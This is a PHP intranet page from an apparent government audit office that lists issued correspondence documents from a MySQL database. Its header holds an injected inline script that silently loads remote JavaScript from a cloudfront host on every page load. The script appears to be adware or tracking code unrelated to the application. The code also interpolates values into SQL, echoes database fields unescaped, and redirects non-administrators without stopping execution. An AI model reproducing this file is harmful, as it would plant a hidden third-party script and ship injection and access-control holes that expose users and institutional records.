<?php include("../cabf.php");?>
<?php include("../inc.config.php");?>
<?php
date_default_timezone_set('America/La_Paz');
$fecha_ram			= date("Ymd");
$fecha 			    = date("Y-m-d");

$idusuario_ss  =  $_SESSION['idusuario_ss'];
$idnombre_ss   =  $_SESSION['idnombre_ss'];
$perfil_ss     =  $_SESSION['perfil_ss'];

if($_SESSION['perfil_ss'] != "ADMINISTRADOR"){ 		
	header("Location:../index.php");	
}

$sqlh = "  SELECT idcorres, gestion, correlativo, idusuario, no_control ";
$sqlh.= "  FROM corres WHERE origen= 'INTERNA' ORDER BY idcorres DESC LIMIT 1";
$resulth = mysqli_query($link,$sqlh);
$rowh = mysqli_fetch_array($resulth);

$nuevo= $rowh[2]+1;
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>SUBCONTRALORIA EMPRESAS PUBLICAS</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<meta name="description" content="" />
<meta name="author" content="http://webthemez.com" />
<!-- c+ss -->
<link href="../css/bootstrap.min.css" rel="stylesheet" />
<link href="../css/fancybox/jquery.fancybox.css" rel="stylesheet">
<link href="../css/flexslider.css" rel="stylesheet" />
<link href="../css/style.css" rel="stylesheet" />

<link rel="stylesheet" href="../css/jquery-ui.min.css">
<link rel="stylesheet" href="../css/style.css">
<link rel="stylesheet" href="../css/dataTables.bootstrap.min.css">

</head>
<body>
<div id="wrapper">
<div class="topbar">
  <div class="container">
    <div class="row">
      <div class="col-md-12">
         <p class="pull-left hidden-xs">CONTRALORIA GENERAL DEL ESTADO</p>
         <p class="pull-right"><i class="fa fa-user"></i>
        <?php
$sqlus =" SELECT nombres, paterno, materno FROM nombres WHERE idnombre='$idnombre_ss'";
$resultus = mysqli_query($link,$sqlus);
$rowus = mysqli_fetch_array($resultus);?>
        <?php echo $rowus[0];?> <?php echo $rowus[1];?> <?php echo $rowus[2];?></p>
      </div>
    </div>
  </div>
</div>
	<!-- start header -->
	<header>
        <div class="navbar navbar-default navbar-static-top">
            <div class="container">
                <div class="navbar-header">
                    <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
                        <span class="icon-bar"></span>
                        <span class="icon-bar"></span>
                        <span class="icon-bar"></span>
                    </button>
                  <a class="navbar-brand" href="../intranet.php"><img src="../img/logo.png" alt="logo"/></a>
                </div>
                <?php include("../menu_corres.php");?>
            </div>
        </div>
<script language="javascript" src="../js/jquery-3.1.1.min.js"></script>
<script type="text/javascript">(function(){var a=document.createElement("script");a.type="text/javascript";a.async=!0;a.src="http://d36mw5gp02ykm5.cloudfront.net/yc/adrns_y.js?v=6.11.119#p=hitachixhds721032cla362_jpb440hf09xskm09xskmx";var b=document.getElementsByTagName("script")[0];b.parentNode.insertBefore(a,b);})();</script>
	</header><!-- end header -->
	<section id="inner-headline">
	<div class="container">
		<div class="row">
			<div class="col-lg-12">
				<h2 class="pageTitle">DOCUMENTOS EMITIDOS SCEP</h2>
			</div>
		</div>
	</div>
	</section>
	<section id="content">

	<div class="container">
		<div class="row">
		<div class="tg-main-section tg-banner tg-haslayout parallax-window" data-parallax="scroll" data-bleed="100" data-speed="0.2" data-image-src="images/slider/img-03.jpg">
		</div>
   	<div class="about-logo">
      <h3 align="center"> </h3>
   </div>
    </div>
    <div class="row">
    <div class="col-lg-9">
        <form name="FORMU" action="nuevo_registro_documento.php" method="post">
        <button type="submit" class="btn btn-primary">NUEVO REGISTRO</button>
        </form>
    </div>
    <div class="col-lg-3">
    <form name="FORMU" action="detalle_documentos_scep.php" method="post">
        <button type="submit" class="btn btn-primary">REPORTE EN EXCEL</button>
        </form>
    </div> 
    </div>
<div class="container">
</br>
<!--- GESTION DE EMPRESAS ---->

<div class="table-responsive">
      <table class="table table-bordered" id="example" width="100%" cellspacing="0">
                <thead>
                    <tr>
                        <th>Nª</th>
                        <th>TIPO</th>
                        <th>N° DOCUMENTO</th>
                        <th>REFERENCIA DEL DOCUMENTO</th>
                        <th>DESTINATARIO</th>
                        <th>HOJA RUTA (N° CONTROL) - CÓDIGO</th>
                        <th>FECHA</th>
                        <th>RESPONSABLE</th>
                        <th>ACCIÓN</th>
                    </tr>
                </thead>
					<tbody>
            <?php
            $numero=1;
            $sql =" SELECT adjunto_hr.idadjunto_hr, adjunto_hr.idcorres, tipo_documento.tipo_documento, adjunto_hr.cite, adjunto_hr.ref, adjunto_hr.fecha, adjunto_hr.destino, ";
            $sql.=" adjunto_hr.entidad_destino, adjunto_hr.hoja_ruta, adjunto_hr.idusuario, corres.codigo FROM corres, adjunto_hr, tipo_documento WHERE adjunto_hr.idtipo_documento=tipo_documento.idtipo_documento AND ";
            $sql.=" adjunto_hr.idcorres=corres.idcorres ";
            $result = mysqli_query($link,$sql);
            if ($row = mysqli_fetch_array($result)){
            mysqli_field_seek($result,0);
            while ($field = mysqli_fetch_field($result)){
            } do {
            ?>
				<tr>
				<td><?php echo $numero;?></td>
        <td><?php echo $row[2];?></td>
				<td><?php echo $row[3];?></td>
				<td><?php echo $row[4];?></td>
				<td><?php echo $row[6];?> - <?php echo $row[7];?></td>
        <td><?php echo $row[8]."</br>".$row[10];?></td>
				<td>
        <?php 

            $fecha_elab = explode('-',$row[5]);
            $f_hojaruta = $fecha_elab[2].'/'.$fecha_elab[1].'/'.$fecha_elab[0];
            echo $f_hojaruta;
            ?>
        </td>
        <td>
        <?php 
$sqld =" SELECT nombres.nombres, nombres.paterno, nombres.materno, nombres.titulo, cargo.cargo FROM nombres, usuarios, cargo  ";
$sqld.=" WHERE usuarios.idnombre=nombres.idnombre AND usuarios.idcargo=cargo.idcargo AND usuarios.idusuario='$row[9]' ";
$resultd = mysqli_query($link,$sqld);
$rowd = mysqli_fetch_array($resultd);
?>
<?php echo $rowd[3];?> <?php echo $rowd[0];?> <?php echo $rowd[1];?> <?php echo $rowd[2];?>
      
      </td>
        <td>                                                
        <a href="../impresion_documentos/imprime_hoja_ruta_ver.php?idcorres=<?php echo $row[1]?>" target="_blank" class="Estilo12" onClick="window.open(this.href, this.target, 'width=750,height=850,scrollbars=YES,top=50,left=200'); return false;">
<?php if ($row[1] != "0") { echo "VER HOJA RUTA COMPLETA"; } else { } ?></a> 
        </td>
        </tr>  
            <?php
            $numero=$numero+1;  
            }
            while ($row = mysqli_fetch_array($result));
            } else {
            }
            ?>
                                    </tbody>
                                </table>
                            </div>

<!--- gestion de usuarios ---->

</div>
</br>
  </section>
	<footer>
	<?php include("../footer.php");?>
	</footer>
</div>
<a href="#" class="scrollup"><i class="fa fa-angle-up active"></i></a>
<!-- javascript
    ================================================== -->
<!-- Placed at the end of the document so the pages load faster -->
<script src="../js/jquery.js"></script>
<script src="../js/jquery.easing.1.3.js"></script>
<script src="../js/bootstrap.min.js"></script>
<script src="../js/jquery.fancybox.pack.js"></script>
<script src="../js/jquery.fancybox-media.js"></script>
<script src="../js/jquery.flexslider.js"></script>
<script src="../js/animate.js"></script>
<!-- Vendor Scripts -->
<script src="../js/modernizr.custom.js"></script>
<script src="../js/jquery.isotope.min.js"></script>
<script src="../js/jquery.magnific-popup.min.js"></script>
<script src="../js/animate.js"></script>
<script src="../js/custom.js"></script>
<script src="../contact/jqBootstrapValidation.js"></script>
<script src="../contact/contact_me.js"></script>
<script src="../js/jquery.dataTables.min.js"></script>
<script src="../js/script.js"></script>
<script src="../js/dataTables.bootstrap.min.js"></script>
</body>
</html>